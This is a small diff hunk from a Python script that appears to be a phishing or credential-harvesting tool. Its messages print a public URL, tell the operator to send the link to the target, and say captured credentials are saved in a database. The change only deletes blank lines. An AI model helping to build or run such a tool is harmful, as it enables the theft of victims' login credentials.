@@ -33,9 +33,6 @@ io.output(info=f"[!] url: {public_url}",color=colors.green)
 io.output(info="All set successfully send the link to the target",color=colors.red)
 io.output(info="The credentials will be saved in the database \n 1.to open the database",color=colors.green)
 dbAdmin.list_tables()
-
-
-
 try:
   print("Running code...")
   time.sleep(5000)
